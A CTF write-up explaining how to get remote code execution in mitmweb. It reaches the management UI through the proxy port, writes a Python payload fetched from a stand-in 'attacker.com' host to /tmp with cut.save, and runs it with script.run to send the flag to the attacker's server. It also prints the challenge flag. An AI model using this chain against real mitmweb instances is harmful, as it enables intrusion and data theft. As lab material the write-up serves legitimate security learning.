# Weakness in the Middle
## Description

That name is way too sus for just a proxy application, isn't it?

The instance will shut down after 3 minutes. 

### Writeup

When mitmweb is launched, a proxy server starts on port 8080 and the management UI starts on port 8081. In this challenge, only port 8080 is exposed externally, but it can be used as a proxy to access port 8081. Although access is protected by a password login, the password is provided in the challenge, so logging in is possible.

mitmweb provides a feature called [Commands](https://docs.mitmproxy.org/stable/concepts/commands/), which allows you to send commands to process data. The goal is to find a useful command among these.

By opening the GUI locally and selecting Options > Display Command Bar, you can open the command palette and view the list of available commands. Looking through them, one suspicious candidate appears: `scripts.run`. From its name, it seems likely to allow arbitrary code execution. Checking the documentation, we find:

> Argument suggestion: script.runflows path
> \# Run a script on the specified flows. The script is configured with the current options and all lifecycle events for each flow are simulated. Note that the load event is not invoked.

It appears to execute a script from the specified path. By inspecting the [source code](https://github.com/mitmproxy/mitmproxy/blob/38a7ee9867f9c472a7557c511bed487e18e96ebf/mitmproxy/addons/script.py#L34) or experimenting, we can confirm that this indeed executes Python code.
Therefore, if we can write a Python file somewhere, we can specify its path and run it.

Next, we look for commands containing `save` that might allow us to write files. Options like `options.save`, `save.file`, and `save.har` do not work, since their formats cannot be interpreted as Python code.

However, the description of `cut.save` looks interesting:

> Argument suggestion: cut.save flows cuts path
> \# Save cuts to file. If there are multiple flows or cuts, the format is UTF-8 encoded CSV. If there is exactly one row and one column, the data is written to file as-is, with raw bytes preserved. If the path is prefixed with a "+", values are appended if there is an existing file.

Here, a [flow](https://docs.mitmproxy.org/stable/addons/commands/#working-with-flows) refers to a traffic record, which can be specified using a [flow filter](https://docs.mitmproxy.org/stable/concepts/filters/).
There is no detailed documentation on cuts, but from the [source code](https://github.com/mitmproxy/mitmproxy/blob/38a7ee9867f9c472a7557c511bed487e18e96ebf/mitmproxy/addons/cut.py#L31), it seems to extract an element of a flow—similar to `getattr` in Python. If the result is exactly one value, it is written to the file as-is (not as CSV).

Using this, we can achieve RCE in the following steps:

1. Send a request through the proxy to `http://attacker.com/pwn.py`. The response contains Python code that sends the flag to the attacker’s server.
2. Run the cut.save command with flows=`~d attacker.com`, cut=`response.txt`, and path=`/tmp/pwn.py`. If the flow result is a single item, the response body from step 1 is written directly to `/tmp/pwn.py`.
3. Run `script.run` with `/tmp/pwn.py` to execute the Python code, which exfiltrates the flag to the attacker’s server.

### Unintended solution

According to [st98's writeup](https://nanimokangaeteinai.hateblo.jp/entry/2025/08/31/213843#Web-500-Weakness-in-the-Middle-1-solves), you can also use `export.file` to export the whole HTTP request to a file instead of `cut.save`. He created HTTP request-Python polyglot, which was really interesting approach.

## Flag

`fwectf{m17m_4774ck_15_unr31473d_LOL}`

